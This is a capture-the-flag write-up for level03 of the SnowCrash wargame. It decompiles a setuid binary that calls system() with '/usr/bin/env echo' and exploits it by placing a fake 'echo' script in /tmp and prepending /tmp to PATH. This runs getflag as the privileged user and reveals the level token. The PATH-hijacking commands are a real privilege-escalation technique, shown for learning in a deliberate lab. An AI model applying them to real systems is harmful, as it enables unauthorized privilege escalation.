## Level 03

### linux privilege escalation using path variable

We can see a file: `level03` which is an executable with special rights.

```
level03@SnowCrash:~$ ls -l ./level03
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 ./level03
```

`s` is a special chmod used to indicate that the group will be set to the owner of the file, here `flag03`. So it means that when executed, we will be considered as member of this group.

Now we can also take a look at the file, when executed we are prompted with `Exploit me`.

We can decompile it using several tools, here's the `Cutter` output, but you can also use [Dogbolt](https://dogbolt.org/) for example.

### level03 decompiled:
```c
void main(void)
{
    undefined4 uVar1;
    undefined4 uVar2;
    int argc;
    char **argv;
    char **envp;

    // int main(int argc,char ** argv,char ** envp);
    uVar1 = getegid(); // get group
    uVar2 = geteuid(); // get user
    setresgid(uVar1, uVar1, uVar1); // set group
    setresuid(uVar2, uVar2, uVar2); // set user
    system("/usr/bin/env echo Exploit me");
    return;
}
```

To put it simply; it sets the group and user as the one used when the program is executed, here `flag03`. Then it spawns a process using `system()`. It will try to use echo given in the `/usr/bin/env` list which is what interests us.

Using this piece of information and [this](https://blog.creekorful.org/2020/09/setuid-privilege-escalation/) wonderful article, we can then create a fake `echo` and add it at the start of our path. What will hapen is that, when we execute `level03`, `echo` will be replaced by our custom [echo](./echo) and executed as `flag03` and not as `level03`. It means that we can use it to replace echo with a simple `getflag`.

```
echo "/bin/sh -c 'getflag'" > /tmp/echo
chmod 755 /tmp/echo
export PATH=/tmp:$PATH
```

And voilà! We got a token!

### Token
```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
